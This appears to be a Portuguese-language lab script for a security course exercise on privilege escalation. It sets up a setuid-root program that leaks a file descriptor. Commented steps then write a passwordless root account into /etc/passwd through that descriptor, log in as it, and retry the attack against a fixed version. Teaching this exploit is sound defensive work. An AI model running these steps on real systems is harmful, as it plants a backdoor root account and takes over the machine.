#!/bin/bash
# Secção 2 — Elevação de Privilégio

# setup
gcc -o passwdleak passwdleak.c
sudo chown root:root passwdleak
sudo chmod 4755 passwdleak

# Exercício 1 - executar o passwdleak
# ./passwdleak

# Exercício 3 - dentro da shell escrever em /etc/passwd via fd herdado
# echo 'ssihacker::0:0::/root:/bin/sh' >&3

# Exercício 4 - fazer login como ssihacker
# exit
# su - ssihacker

# Exercício 5 - compilar a correção e tentar o mesmo exploit
gcc -o fix fix.c
sudo chown root:root fix
sudo chmod 4755 fix
# ./fix
# echo 'ssihacker2::0:0::/root:/bin/sh' >&3